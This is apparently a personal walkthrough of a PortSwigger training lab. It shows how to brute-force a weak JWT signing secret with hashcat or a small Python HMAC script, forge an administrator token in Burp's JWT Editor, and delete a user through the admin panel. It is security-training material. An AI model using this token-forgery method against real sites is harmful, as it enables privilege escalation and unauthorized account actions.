
# #PortSwigger 


![[Pasted image 20260531021631.png]]

## Lab Description

> This lab uses a JWT-based mechanism for handling sessions. It uses an extremely weak secret key to both sign and verify tokens. This can be easily brute-forced using a wordlist of common secrets.
> 
> **Objective:** Brute-force the website's secret key, use it to sign a modified session token that gives you access to the admin panel at `/admin`, then delete the user `carlos`.
> 
> - **Your credentials:** `wiener:peter`

---
---

## Step 1: Understanding JWT Structure

**JSON Web Tokens (JWT)** consist of three parts separated by dots:
```
Header.Payload.Signature
```

Example:
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ3aWVuZXIiLCJpYXQiOjE1MTYyMzkwMjJ9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

|Part|Content|Encoding|
|---|---|---|
|Header|Algorithm & token type|Base64|
|Payload|Claims (user, expiry, etc.)|Base64|
|Signature|HMAC of header+payload with secret|Base64|

**The vulnerability:** The server uses an **extremely weak secret key** (`secret1`) that can be brute-forced.

---

## Step 2: Reconnaissance

### Step 2.1: Log in to Your Account

1. Log in with `wiener:peter`
2. Capture the `GET /my-account` request after login

### Step 2.2: Identify the JWT

Look for the cookie containing the JWT:
```
Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

![[Pasted image 20260531024132.png]]


### Step 2.3: Test Admin Access

In Burp Repeater, change the path to `/admin`:
![[Pasted image 20260531024448.png]]

**Response:** `403 Forbidden` (only administrator can access)
![[Pasted image 20260531024532.png]]


---

## Step 3: Brute-Forcing the Secret Key

### Step 3.1: Extract the JWT

Copy the entire JWT string.

### Step 3.2: Save the JWT to a File

```
echo "eyJraWQiOiIxMzNmMTQ0ZC1iMGMwLTQ5NmMtYmUyYy03M2M2ODZiNmJhOGEiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc4MDE3ODkyMSwic3ViIjoid2llbmVyIn0.J2aG_7TBgunOnqSjez6khfIWFifYQ40_m2RDpFTuHjw" > jwt.txt
```

### Step 3.3: Use hashcat to Brute-Force

The hashcat mode for JWT (HMAC-SHA256) is **16500**:
```
hashcat -a 0 -m 16500 jwt.txt ~/Downloads/jwt.secrets.list
```
 Or:
 ```
 nano jwt_check.py
 ```

```
python3 jwt_check.py
```

 ```
import hmac, hashlib, base64

jwt = open('jwt.txt').read().strip()
parts = jwt.split('.')
print("Parts count:", len(parts))

header_payload = parts[0] + '.' + parts[1]
signature = parts[2]

secrets = ['secret1', 'secret', 'password', '123456', 'jwt', 'secret123']

for secret in secrets:
    sig = hmac.new(secret.encode(), header_payload.encode(), hashlib.sha256).digest()
    encoded = base64.urlsafe_b64encode(sig).rstrip(b'=').decode()
    if encoded == signature:
        print('FOUND! Secret =', secret)
        break
    else:
        print('Not:', secret)

print('\nJWT signature:', signature)
 ```

Result:
![[Pasted image 20260531031638.png]]

- Secret found: `secret1`

---

## Step 4: Generating a Forged Signing Key

### Step 4.1: Base64 Encode the Secret

Using Burp Decoder or command line:
```
echo -n "secret1" | base64
```

**Output:**
```
c2VjcmV0MQ==
```

![[Pasted image 20260531032322.png]]

### Step 4.2: Install JWT Editor Extension

1. Go to **Burp Suite** --> **Extender** --> **BApp Store**
2. Search for **"JWT Editor"**
3. Click **Install**

![[Pasted image 20260531032500.png]]


### Step 4.3: Create a New Symmetric Key

1. Go to **JWT Editor** tab --> **Keys** tab
2. Click **New Symmetric Key**
3. Click **Generate** (auto-fills with random values)
4. Replace the `k` property value with your Base64-encoded secret:
```
{
    "k": "c2VjcmV0MQ==",
    "kty": "oct",
    "kid": "generated-id"
}
```

![[Pasted image 20260531032708.png]]

5. Click **OK**


---

## Step 5: Modifying and Signing the JWT

### Step 5.1: Locate the Request in Repeater

In Burp Repeater, find the `GET /admin` request.
![[Pasted image 20260531033454.png]]

### Step 5.2: Switch to JSON Web Token Editor

Look for the **"JSON Web Token"** tab within Repeater (added by JWT Editor extension).
![[Pasted image 20260531033441.png]]

### Step 5.3: Modify the Payload

Change the `sub` claim (subject) from `wiener` to `administrator`:

**Original payload:**
```
{
    "sub": "wiener",
    "iat": 1516239022
}
```

**Modified payload:**
```
{
    "sub": "administrator",
    "iat": 1516239022
}
```

![[Pasted image 20260531033612.png]]

### Step 5.4: Sign the Token

1. Click **Sign** at the bottom of the tab
2. Select the symmetric key you created (`secret1`)
3. Ensure **"Don't modify header"** is selected
![[Pasted image 20260531033650.png]]

4. Click **OK**

The JWT is now re-signed with the correct signature.

### Step 5.5: Send the Request

Click **Send** in Repeater.
![[Pasted image 20260531033721.png]]
**Response:** `200 OK` - Admin panel accessed!

---

## Step 6: Deleting User Carlos

### Step 6.1: Find the Delete Endpoint

In the admin panel response, look for the delete link:
```
<a href="/admin/delete?username=carlos">Delete</a>
```

### Step 6.2: Send the Delete Request

Modify the request to:
```
GET /admin/delete?username=carlos HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Authorization: Bearer [FORGED_JWT]
```

![[Pasted image 20260531033845.png]]

Or simply click the link in the response preview.

### Step 6.3: Verify Deletion

**Expected response:** `302 Found` or `200 OK`

---

## Step 7: Lab Solved

Success message displayed:

![[Pasted image 20260531033924.png]]

---
---
